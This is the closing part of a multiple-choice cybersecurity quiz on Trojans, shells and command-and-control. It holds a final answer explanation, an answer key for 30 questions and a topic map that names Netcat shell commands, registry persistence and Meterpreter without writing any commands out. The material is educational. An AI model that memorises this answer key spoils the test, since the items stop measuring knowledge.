C) Re-image the affected system — this is the only reliable way to remove all persistence mechanisms — ✅ Correct. Industry standard for confirmed Trojan infections.
D) Change all user passwords and enable MFA on the compromised account — ❌ Password changes and MFA address credential compromise — they do not remove the Trojan or its persistence mechanisms from the system.

---

## Quick Answer Key

| Q | Answer | Q | Answer | Q | Answer |
|---|---|---|---|---|---|
| Q1 | B | Q11 | B | Q21 | C |
| Q2 | B | Q12 | C | Q22 | B |
| Q3 | C | Q13 | B | Q23 | C |
| Q4 | B | Q14 | B | Q24 | B |
| Q5 | B | Q15 | C | Q25 | B |
| Q6 | C | Q16 | C | Q26 | A |
| Q7 | C | Q17 | C | Q27 | C |
| Q8 | D | Q18 | B | Q28 | D |
| Q9 | C | Q19 | B | Q29 | C |
| Q10 | C | Q20 | C | Q30 | C |

---

## Topic Coverage Map

| Q | Section | Concept Tested |
|---|---|---|
| Q1 | Section 1.3 | Trojan vs Virus — self-replication distinction |
| Q2 | Section 4.1 | Bind shell definition — victim listens |
| Q3 | Section 4.2 | Reverse shell — firewall bypass mechanism |
| Q4 | Section 3.3 | Downloader Trojan — purpose |
| Q5 | Section 5.4 | Netcat reverse shell command — Windows victim |
| Q6 | Section 2.1 | Overt channel definition |
| Q7 | Section 1.2 | MITRE ATT&CK TA0003 — Persistence |
| Q8 | Section 1.4 | SUNBURST — supply chain Trojan delivery |
| Q9 | Section 5.2 | Netcat -e flag — execute and pipe |
| Q10 | Section 3.5 | Man-in-the-Browser banking Trojan |
| Q11 | Section 2.2 | Covert channel definition |
| Q12 | Section 5.3 | Netcat bind shell command — Linux victim |
| Q13 | Section 5.5 | Registry Run Key persistence — reg add |
| Q14 | Section 2.3 | Storage covert channel — DNS subdomain |
| Q15 | Section 4.2 | Reverse shell preferred — firewall bypass |
| Q16 | Section 5.1 | Netcat — Swiss Army knife |
| Q17 | Section 3.7 | NotPetya — destructive Trojan / wiper |
| Q18 | Section 3.1 | RAT vs backdoor — capability comparison |
| Q19 | Section 6.2 | Beaconing — C2 periodic connection |
| Q20 | Section 6.1 | Host-based IOC — Registry Run key |
| Q21 | Section 4.4 | MITRE ATT&CK TA0011 — C2 |
| Q22 | Section 2.4 | HTTP tunnelling — purpose and mechanism |
| Q23 | Section 3.5 | Zeus — banking Trojan classification |
| Q24 | Section 6.2 | DGA — domain generation for C2 resilience |
| Q25 | Section 5.2 | Netcat listen mode flags |
| Q26 | Section 2.2 | Covert channel vs encrypted channel |
| Q27 | Extra Notes | Operation Duck Hunt — QakBot disruption 2023 |
| Q28 | Extra Notes | IT Act 2000 S.66F — cyber terrorism penalty |
| Q29 | Section 4.4 | Meterpreter transport — reverse_https |
| Q30 | Section 6.3 | Re-imaging — reliable Trojan remediation |

---